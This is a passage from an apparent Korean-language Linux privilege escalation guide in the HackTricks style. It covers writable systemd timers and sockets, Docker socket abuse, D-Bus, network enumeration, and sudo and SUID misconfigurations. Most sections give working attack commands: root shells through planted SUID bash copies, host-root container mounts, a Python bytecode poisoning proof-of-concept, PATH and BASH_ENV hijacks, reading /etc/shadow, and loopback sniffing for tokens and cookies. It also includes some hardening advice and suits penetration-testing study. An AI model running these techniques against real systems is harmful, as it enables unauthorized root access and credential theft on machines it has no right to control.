
다음 명령으로 모든 timer를 열거할 수 있습니다:
```bash
systemctl list-timers --all
```
### 쓰기 가능한 timers

타이머를 수정할 수 있다면 systemd.unit에 존재하는 항목(예: `.service` 또는 `.target`)을 실행하도록 만들 수 있습니다.
```bash
Unit=backdoor.service
```
문서에서 Unit이 무엇인지 확인할 수 있습니다:

> 이 timer가 만료될 때 활성화할 Unit입니다. 인수는 ".timer" 접미사가 없는 Unit 이름입니다. 지정하지 않으면 이 값은 접미사를 제외하고 timer Unit과 동일한 이름을 가진 service로 기본 설정됩니다. (위 참조.) 활성화되는 Unit 이름과 timer Unit 이름은 접미사만 제외하고 동일하게 지정하는 것이 좋습니다.

따라서 이 권한을 악용하려면 다음을 수행해야 합니다:

- **writable binary를 실행하는** 일부 systemd Unit(예: `.service`)을 찾습니다.
- **relative path를 실행하며**, 해당 실행 파일을 사칭할 수 있도록 **systemd PATH**에 대해 **writable privileges**를 보유한 systemd Unit을 찾습니다.

**`man systemd.timer`로 timer에 대해 자세히 알아보세요.**

### **Timer 활성화**

Timer를 활성화하려면 root privileges가 필요하며 다음을 실행해야 합니다:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
`/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`에 symlink를 생성하여 **timer**를 **activated**한다는 점에 유의하세요.

## Sockets

Unix Domain Sockets(UDS)는 client-server 모델 내에서 동일한 시스템 또는 서로 다른 시스템의 **process communication**을 가능하게 합니다. inter-computer communication을 위해 표준 Unix descriptor 파일을 사용하며, `.socket` 파일을 통해 설정됩니다.

Sockets는 `.socket` 파일을 사용하여 설정할 수 있습니다.

**`man systemd.socket`으로 sockets에 대해 자세히 알아보세요.** 이 파일 내부에서는 다음과 같은 몇 가지 흥미로운 parameter를 설정할 수 있습니다.

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: 이 옵션들은 서로 다르지만, socket이 **어디에서 listen할지**를 나타내는 데 사용됩니다(AF_UNIX socket 파일의 경로, listen할 IPv4/6 및/또는 port number 등).
- `Accept`: boolean argument를 받습니다. **true**인 경우 **각 incoming connection마다 service instance가 spawn**되며 connection socket만 전달됩니다. **false**인 경우 모든 listening socket 자체가 **started service unit에 전달**되고, 모든 connection에 대해 하나의 service unit만 spawn됩니다. 이 값은 datagram socket과 FIFO에서는 무시되며, 단일 service unit이 모든 incoming traffic을 무조건 처리합니다. **기본값은 false**입니다. 성능상의 이유로 새로운 daemon은 `Accept=no`에 적합한 방식으로 작성하는 것이 권장됩니다.
- `ExecStartPre`, `ExecStartPost`: listening **socket**/FIFO가 각각 **생성**되고 bind되기 **전** 또는 **후**에 **실행되는** 하나 이상의 command line을 받습니다. command line의 첫 번째 token은 absolute filename이어야 하며, 그 뒤에 process에 전달할 arguments가 와야 합니다.
- `ExecStopPre`, `ExecStopPost`: listening **socket**/FIFO가 각각 **close**되고 제거되기 **전** 또는 **후**에 **실행되는** 추가 **commands**입니다.
- `Service`: **incoming traffic**에서 **activate할** **service** unit name을 지정합니다. 이 설정은 Accept=no인 socket에서만 허용됩니다. 기본값은 socket과 동일한 이름을 가진 service입니다(suffix는 대체됨). 대부분의 경우 이 옵션을 사용할 필요는 없습니다.

### Writable .socket files

**writable** `.socket` 파일을 발견했다면 `[Socket]` section의 시작 부분에 `ExecStartPre=/home/kali/sys/backdoor`와 같은 항목을 **추가**할 수 있으며, 그러면 socket이 생성되기 전에 backdoor가 실행됩니다. 따라서 **machine이 reboot될 때까지 기다려야 할 가능성이 높습니다.**\
_시스템이 해당 socket file configuration을 사용하고 있어야 하며, 그렇지 않으면 backdoor가 실행되지 않는다는 점에 유의하세요._

### Socket activation + writable unit path (create missing service)

또 다른 high-impact misconfiguration은 다음과 같습니다.

- `Accept=no` 및 `Service=<name>.service`가 설정된 socket unit
- 참조된 service unit이 없음
- attacker가 `/etc/systemd/system`(또는 다른 unit search path)에 write할 수 있음

이 경우 attacker는 `<name>.service`를 생성한 다음 socket으로 traffic을 trigger할 수 있으며, 그러면 systemd가 새로운 service를 root 권한으로 load하고 execute합니다.

간단한 flow:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### 쓰기 가능한 sockets

**쓰기 가능한 socket을 식별하면** (_여기서는 config `.socket` 파일이 아닌 Unix Sockets에 대해 이야기하고 있습니다_), **해당 socket과 통신**하여 취약점을 exploit할 수 있습니다.

### Unix Sockets 열거
```bash
netstat -a -p --unix
```
### Raw 연결
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation 예시:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP 소켓

**HTTP** 요청을 수신 대기 중인 **소켓**이 있을 수 있습니다(_여기서 .socket 파일을 말하는 것이 아니라 unix socket으로 작동하는 파일을 말합니다_). 다음 명령어로 이를 확인할 수 있습니다:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
소켓이 **HTTP 요청에 응답**한다면 해당 소켓과 **통신**할 수 있으며, **일부 취약점을 exploit**할 수도 있습니다.

### Writable Docker Socket

Docker socket은 일반적으로 `/var/run/docker.sock`에 있으며, 보안이 유지되어야 하는 중요한 파일입니다. 기본적으로 `root` 사용자와 `docker` 그룹의 구성원이 이 파일에 쓸 수 있습니다. 이 소켓에 대한 쓰기 권한을 보유하면 privilege escalation으로 이어질 수 있습니다. 다음은 이를 수행하는 방법과 Docker CLI를 사용할 수 없는 경우의 대체 방법에 대한 설명입니다.

#### **Docker CLI를 사용한 Privilege Escalation**

Docker socket에 대한 쓰기 권한이 있다면 다음 명령을 사용하여 권한을 상승시킬 수 있습니다:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
이 명령을 사용하면 호스트의 파일 시스템에 root-level access 권한으로 컨테이너를 실행할 수 있습니다.

#### **Docker API Directly 사용**

Docker CLI를 사용할 수 없는 경우에도 Docker API와 `curl` 명령을 사용하여 Docker socket을 조작할 수 있습니다.

1.  **Docker Images 나열:** 사용 가능한 image 목록을 가져옵니다.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Container 생성:** 호스트 시스템의 root 디렉터리를 mount하는 container를 생성하도록 요청을 전송합니다.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

새로 생성된 container를 시작합니다:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Container에 연결:** `socat`을 사용하여 container에 연결하고, 그 안에서 명령을 실행할 수 있도록 합니다.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` 연결을 설정한 후에는 호스트의 filesystem에 root-level access 권한으로 container 안에서 직접 명령을 실행할 수 있습니다.

### 기타

Docker socket에 대한 쓰기 권한이 있고 **`docker` group 내부에 속해 있다면**, [**privilege를 escalate할 수 있는 더 많은 방법**](../../user-information/interesting-groups-linux-pe/index.html#docker-group)이 있습니다. [**Docker API가 port에서 listening 중이라면**](../../../network-services-pentesting/2375-pentesting-docker.md#compromising) 이를 compromise할 수도 있습니다.

**Container에서 탈출하거나 container runtime을 abuse하여 privilege를 escalate하는 더 많은 방법**은 다음에서 확인하세요:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

`**ctr**` 명령을 사용할 수 있다면 다음 페이지를 읽어 보세요. **이를 abuse하여 privilege를 escalate할 수 있을 수 있습니다**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

`**runc**` 명령을 사용할 수 있다면 다음 페이지를 읽어 보세요. **이를 abuse하여 privilege를 escalate할 수 있을 수 있습니다**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus는 애플리케이션이 효율적으로 상호 작용하고 데이터를 공유할 수 있도록 하는 정교한 **inter-Process Communication (IPC) system**입니다. 현대적인 Linux system을 고려하여 설계되었으며, 다양한 형태의 애플리케이션 통신을 위한 강력한 framework를 제공합니다.

이 system은 process 간의 데이터 교환을 향상하는 기본 IPC를 지원하며, 이는 **enhanced UNIX domain sockets**를 연상시킵니다. 또한 event 또는 signal을 broadcast하여 system component 간의 원활한 통합을 지원합니다. 예를 들어 Bluetooth daemon이 수신 전화를 알리는 signal을 보내면 music player가 음소거되어 user experience를 향상할 수 있습니다. 또한 D-Bus는 remote object system을 지원하여 애플리케이션 간의 service request와 method invocation을 단순화하고, 기존에는 복잡했던 process를 간소화합니다.

D-Bus는 **allow/deny model**로 동작하며, 일치하는 policy rule의 누적된 효과에 따라 message permission(method call, signal emission 등)을 관리합니다. 이러한 policy는 bus와의 상호 작용을 지정하며, 해당 permission을 exploit하여 privilege escalation이 가능할 수 있습니다.

이러한 policy의 예로 `/etc/dbus-1/system.d/wpa_supplicant.conf`가 있으며, `fi.w1.wpa_supplicant1`에 대해 root user가 own, send, receive할 수 있는 message permission을 자세히 지정합니다.

user 또는 group이 지정되지 않은 policy는 모든 대상에 보편적으로 적용됩니다. 반면 `"default"` context policy는 다른 특정 policy가 적용되지 않는 모든 대상에 적용됩니다.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**D-Bus communication을 enumerate하고 exploit하는 방법 알아보기:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **네트워크**

네트워크를 항상 enumerate하여 머신의 위치를 파악하는 것은 흥미롭습니다.

### 일반적인 enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Outbound filtering 빠른 triage

호스트에서 명령을 실행할 수 있지만 callback이 실패하는 경우, DNS, transport, proxy 및 route filtering을 신속하게 구분합니다:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### 열린 포트

접근하기 전에 이전에 상호작용하지 못했던 머신에서 실행 중인 네트워크 서비스를 항상 확인하세요:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
bind target에 따라 listener를 분류합니다:

- `0.0.0.0` / `[::]`: 모든 로컬 인터페이스에서 노출됩니다.
- `127.0.0.1` / `::1`: 로컬 전용입니다(터널/forward 후보로 적합).
- 특정 내부 IP(예: `10.x`, `172.16/12`, `192.168.x`, `fe80::`): 일반적으로 내부 세그먼트에서만 접근할 수 있습니다.

### 로컬 전용 서비스 triage workflow

호스트를 compromise하면 `127.0.0.1`에 바인드된 서비스에 shell에서 처음으로 접근할 수 있는 경우가 많습니다. 간단한 로컬 workflow는 다음과 같습니다:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS as a network scanner (network-only mode)

로컬 PE checks 외에도 linPEAS는 집중형 network scanner로 실행할 수 있습니다. 사용 가능한 binaries를 `$PATH`에서 사용하며(일반적으로 `fping`, `ping`, `nc`, `ncat`), tooling을 설치하지 않습니다.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
`-t` 없이 `-d`, `-p` 또는 `-i`를 전달하면 linPEAS는 순수 네트워크 스캐너로 동작합니다(나머지 권한 상승 검사는 건너뜀).

### Sniffing

트래픽을 스니핑할 수 있는지 확인합니다. 가능하다면 일부 자격 증명을 획득할 수 있습니다.
```
timeout 1 tcpdump
```
빠른 실용 점검:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback(`lo`)는 많은 내부 전용 서비스가 해당 인터페이스에 tokens/cookies/credentials를 노출하기 때문에 post-exploitation에서 특히 유용합니다:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
지금 Capture하고, 나중에 parse:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## 사용자

### 일반 열거

자신이 **누구**인지, 어떤 **권한**을 가지고 있는지, 시스템에 어떤 **사용자**가 있는지, 어떤 사용자가 **로그인**할 수 있는지, 그리고 어떤 사용자가 **root 권한**을 가지고 있는지 확인하세요:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

일부 Linux 버전은 **UID > INT_MAX**인 사용자가 권한을 상승시킬 수 있는 bug의 영향을 받았습니다. 자세한 정보: [여기](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [여기](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh), [여기](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it**: **`systemd-run -t /bin/bash`**

### Groups

root 권한을 부여할 수 있는 **그룹의 구성원**인지 확인합니다:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Clipboard

가능하다면 clipboard 내부에 흥미로운 내용이 있는지 확인합니다.
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### 비밀번호 정책
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 알려진 비밀번호

환경의 **어떤 비밀번호라도 알고 있다면** 해당 비밀번호를 사용하여 **각 사용자로 login을 시도**하세요.

### Su Brute

많은 noise가 발생하는 것을 신경 쓰지 않고 컴퓨터에 `su` 및 `timeout` binary가 있다면 [su-bruteforce](https://github.com/carlospolop/su-bruteforce)를 사용하여 user를 brute-force할 수 있습니다.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)의 `-a` parameter도 user를 brute-force하려고 시도합니다.

## Writable PATH abuses

### $PATH

**$PATH 내부의 일부 folder에 write할 수 있다면**, **writable folder 안에 backdoor를 생성**하여 privilege escalation을 수행할 수 있습니다. 이때 backdoor의 이름은 다른 user(이상적으로는 root)가 실행할 command의 이름이어야 하며, 해당 command가 $PATH에서 writable folder보다 **앞에 위치한 folder에서 load되지 않아야** 합니다.

### SUDO and SUID

sudo를 사용하여 일부 command를 execute할 수 있거나 suid bit가 설정되어 있을 수 있습니다. 다음 명령으로 확인하세요:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
일부 **예상치 못한 명령어를 사용하면 파일을 읽거나 쓰거나, 심지어 명령어를 실행할 수도 있습니다.** 예를 들어:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo 설정에 따라 사용자는 비밀번호를 몰라도 다른 사용자의 권한으로 일부 명령을 실행할 수 있습니다.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
이 예제에서 `demo` 사용자는 `vim`을 `root`로 실행할 수 있으므로, 이제 root 디렉터리에 SSH 키를 추가하거나 `sh`를 호출하여 셸을 얻는 것은 간단합니다.
```
sudo vim -c '!sh'
```
### SETENV

이 directive를 사용하면 사용자가 무언가를 실행하는 동안 **환경 변수 설정**을 할 수 있습니다:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
이 예제는 **HTB machine Admirer를 기반으로 한 것**으로, 스크립트를 root로 실행하는 동안 임의의 python library를 로드하는 **PYTHONPATH hijacking**에 **취약했습니다**:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### sudo-allowed Python imports에서 쓰기 가능한 `__pycache__` / `.pyc` poisoning

**sudo-allowed Python script**가 패키지 디렉터리에 **쓰기 가능한 `__pycache__`**가 있는 모듈을 import하는 경우, 캐시된 `.pyc`를 교체하여 다음 import 시 권한이 높은 사용자로 code execution을 수행할 수 있습니다.

- 작동하는 이유:
- CPython은 `__pycache__/module.cpython-<ver>.pyc`에 bytecode cache를 저장합니다.
- interpreter는 **header**(source에 연결된 magic + timestamp/hash metadata)를 검증한 다음, 해당 header 뒤에 저장된 marshaled code object를 실행합니다.
- 디렉터리에 쓰기 권한이 있어 캐시된 파일을 **삭제하고 다시 생성**할 수 있다면, root-owned이지만 쓰기 불가능한 `.pyc`도 교체할 수 있습니다.
- 일반적인 경로:
- `sudo -l`에 root로 실행할 수 있는 Python script 또는 wrapper가 표시됩니다.
- 해당 script는 `/opt/app/`, `/usr/local/lib/...` 등의 local module을 import합니다.
- import된 module의 `__pycache__` 디렉터리가 사용자 또는 모든 사용자에게 쓰기 가능합니다.

빠른 enumeration:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
권한이 있는 스크립트를 검사할 수 있다면, import된 모듈과 해당 캐시 경로를 확인합니다:
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
악용 workflow:

1. sudo가 허용된 script를 한 번 실행하여, legit cache file이 아직 없다면 Python이 이를 생성하도록 합니다.
2. legit `.pyc`에서 처음 16바이트를 읽고 poisoned file에서 재사용합니다.
3. payload code object를 compile하고 `marshal.dumps(...)`로 직렬화한 다음, 기존 cache file을 삭제하고 원본 header와 malicious bytecode를 결합하여 다시 생성합니다.
4. sudo가 허용된 script를 다시 실행하여 import 과정에서 payload가 root 권한으로 실행되도록 합니다.

중요 참고 사항:

- 원본 header를 재사용하는 것이 핵심입니다. Python은 bytecode body가 실제로 source와 일치하는지가 아니라 cache metadata를 source file과 비교하기 때문입니다.
- source file이 root 소유이며 writable하지 않지만, 이를 포함하는 `__pycache__` directory가 writable한 경우 특히 유용합니다.
- privileged process가 `PYTHONDONTWRITEBYTECODE=1`을 사용하거나, 권한이 안전하게 설정된 위치에서 import하거나, import path의 모든 directory에 대한 write access를 제거한 경우 attack은 실패합니다.

최소 proof-of-concept 형태:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
보안 강화:

- 권한이 높은 Python import path의 어떤 디렉터리도 권한이 낮은 사용자가 쓸 수 없도록 하며, `__pycache__`도 포함합니다.
- 권한이 높은 실행에서는 `PYTHONDONTWRITEBYTECODE=1`을 고려하고, 예상치 못하게 쓰기 가능한 `__pycache__` 디렉터리가 있는지 주기적으로 확인합니다.
- 쓰기 가능한 로컬 Python 모듈과 쓰기 가능한 cache 디렉터리는 root가 실행하는 쓰기 가능한 shell script 또는 shared library와 동일하게 취급합니다.

### sudo env_keep을 통해 보존된 BASH_ENV → root shell

sudoers가 `BASH_ENV`를 보존하는 경우(예: `Defaults env_keep+="ENV BASH_ENV"`), 허용된 명령을 실행할 때 Bash의 non-interactive startup 동작을 활용하여 root 권한으로 임의의 code를 실행할 수 있습니다.

- 작동 원리: non-interactive shell의 경우 Bash는 대상 script를 실행하기 전에 `$BASH_ENV`를 평가하고 해당 파일을 source합니다. 많은 sudo 규칙은 script 또는 shell wrapper의 실행을 허용합니다. `BASH_ENV`가 sudo에 의해 보존되면, 해당 파일이 root 권한으로 source됩니다.

- 요구 사항:
- 실행할 수 있는 sudo rule(any target that invokes `/bin/bash` non-interactively, or any bash script).
- `env_keep`에 `BASH_ENV`가 포함되어 있어야 합니다(`sudo -l`로 확인).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- `env_keep`에서 `BASH_ENV`(및 `ENV`)를 제거하고, `env_reset`을 선호합니다.
- sudo 허용 명령에 shell wrapper를 사용하지 말고, 최소한의 binary를 사용합니다.
- 보존된 env var가 사용될 때 sudo I/O logging 및 alerting을 고려합니다.

### sudo를 통한 Terraform과 보존된 HOME (!env_reset)

sudo가 environment를 그대로 유지하는 경우(`!env_reset`) `terraform apply`를 허용하면 `$HOME`은 호출한 사용자의 값으로 유지됩니다. 따라서 Terraform은 **$HOME/.terraformrc**를 root로 실행하면서 로드하고 `provider_installation.dev_overrides`를 따릅니다.

- 필요한 provider를 writable directory로 지정하고, provider 이름을 딴 malicious plugin(예: `terraform-provider-examples`)을 배치합니다:
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform은 Go plugin handshake에 실패하지만, 종료되기 전에 payload를 root 권한으로 실행하여 SUID shell을 남깁니다.

### TF_VAR 재정의 + symlink 검증 우회

Terraform 변수는 `TF_VAR_<name>` 환경 변수를 통해 제공할 수 있으며, sudo가 환경 변수를 보존하면 해당 변수도 유지됩니다. `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`와 같은 취약한 검증은 symlink를 사용해 우회할 수 있습니다:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform은 symlink를 확인한 후 실제 `/root/root.txt`를 attacker가 읽을 수 있는 destination으로 복사합니다. 동일한 방식으로 destination symlink를 미리 생성하여 privileged path에 **write**할 수도 있습니다(예: provider의 destination path가 `/etc/cron.d/` 내부를 가리키도록 설정).

### requiretty / !requiretty

일부 오래된 배포판에서는 sudo가 `requiretty`로 구성될 수 있으며, 이 경우 sudo는 interactive TTY에서만 실행됩니다. `!requiretty`가 설정되어 있거나 해당 옵션이 없으면 reverse shells, cron jobs 또는 scripts와 같은 non-interactive context에서 sudo를 실행할 수 있습니다.
```bash
Defaults !requiretty
```
이는 그 자체로 직접적인 vulnerability는 아니지만, 완전한 PTY 없이도 sudo rules를 악용할 수 있는 상황을 확대합니다.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

`sudo -l`에 `env_keep+=PATH`가 표시되거나, attacker가 쓰기 가능한 항목(예: `/home/<user>/bin>`)을 포함한 `secure_path`가 표시되면 sudo-allowed target 내부의 모든 relative command를 shadow할 수 있습니다.

- Requirements: absolute path 없이(`free`, `df`, `ps` 등) commands를 호출하는 script/binary를 실행하는 sudo rule(대개 `NOPASSWD`)과, 먼저 검색되는 writable PATH entry.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo 실행 경로 우회
**Jump**하여 다른 파일을 읽거나 **symlinks**를 사용합니다. 예를 들어 sudoers 파일에서: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
**wildcard**가 사용되면 (\*), 훨씬 더 쉽습니다:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**대응책**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### 명령어 경로가 없는 Sudo command/SUID binary

**sudo permission**이 단일 명령어에 **경로를 지정하지 않은 상태로** 부여된 경우: _hacker10 ALL= (root) less_, PATH 변수를 변경하여 이를 exploit할 수 있습니다.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
이 technique은 **suid** binary가 경로를 지정하지 않고 다른 command를 **실행하는 경우에도 사용할 수 있습니다(항상** _**strings**_ **를 사용해 이상한 SUID binary의 내용을 확인하세요)**.

[실행할 Payload examples.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### command path를 사용하는 SUID binary

**suid** binary가 **경로를 지정하여 다른 command를 실행하는 경우**, 해당 suid file이 호출하는 command의 이름으로 **function을 export**해 볼 수 있습니다.

예를 들어 suid binary가 _**/usr/sbin/service apache2 start**_를 호출한다면, function을 생성하고 export해 보아야 합니다:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
